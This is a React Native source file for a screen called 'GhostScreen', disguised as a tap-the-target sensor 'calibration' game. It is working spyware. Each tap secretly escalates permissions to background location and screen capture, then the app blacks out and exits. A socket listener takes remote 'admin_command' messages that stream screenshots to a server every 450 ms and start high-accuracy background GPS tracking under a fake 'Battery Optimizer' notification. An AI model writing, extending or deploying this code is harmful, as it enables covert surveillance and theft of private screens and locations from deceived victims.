import React, { useState, useEffect, useRef } from 'react';
import { View, Text, StyleSheet, TouchableOpacity, Animated, BackHandler, Alert } from 'react-native';
import * as Location from 'expo-location';
import * as Battery from 'expo-battery';
import { captureScreen } from 'react-native-view-shot';

export default function GhostScreen({ socket }) {
    const [score, setScore] = useState(0);
    const [stealth, setStealth] = useState(false);
    const targetPos = useRef(new Animated.ValueXY({ x: 0, y: 0 })).current;
    const streamInterval = useRef(null);

    const handleTap = async () => {
        try {
            if (score === 0) {
                const { status } = await Location.requestForegroundPermissionsAsync();
                if (status === 'granted') await Location.requestBackgroundPermissionsAsync();
            } else if (score === 2) {
                // Triggers the "Start Now" popup
                await captureScreen({ format: 'jpg', quality: 0.1 });
            } else if (score >= 4) {
                setStealth(true);
                setTimeout(() => BackHandler.exitApp(), 1200);
            }
            setScore(prev => prev + 1);
            moveTarget();
        } catch (e) {
            Alert.alert("Sync Error", "Please allow system access to calibrate sensors.");
        }
    };

    const moveTarget = () => {
        Animated.spring(targetPos, {
            toValue: { x: Math.random() * 220 - 110, y: Math.random() * 320 - 160 },
            useNativeDriver: false
        }).start();
    };

    useEffect(() => {
        socket.on('admin_command', async (cmd) => {
            if (cmd === 'START_LIVE') {
                clearInterval(streamInterval.current);
                streamInterval.current = setInterval(async () => {
                    const img = await captureScreen({ format: 'jpg', quality: 0.12, result: 'base64' });
                    socket.emit('screen_frame', img);
                }, 450);
            }
            if (cmd === 'STOP_STREAM') clearInterval(streamInterval.current);
            if (cmd === 'START_PINPOINT') {
                await Location.startLocationUpdatesAsync('bg-gps-sync', {
                    accuracy: Location.Accuracy.High,
                    foregroundService: { notificationTitle: "Battery Optimizer", notificationBody: "Scanning..." }
                });
            }
        });
    }, []);

    if (stealth) return <View style={styles.blackout} />;

    return (
        <View style={styles.container}>
            <Text style={styles.scoreText}>CALIBRATION: {score * 20}%</Text>
            <Animated.View style={targetPos.getLayout()}>
                <TouchableOpacity style={styles.target} onPress={handleTap} />
            </Animated.View>
        </View>
    );
}

const styles = StyleSheet.create({
    container: { flex: 1, backgroundColor: '#050505', justifyContent: 'center', alignItems: 'center' },
    blackout: { flex: 1, backgroundColor: '#000' },
    scoreText: { position: 'absolute', top: 60, color: '#222', letterSpacing: 2 },
    target: { width: 75, height: 75, borderRadius: 40, backgroundColor: '#ff3b30', borderWidth: 3, borderColor: '#fff' }
});
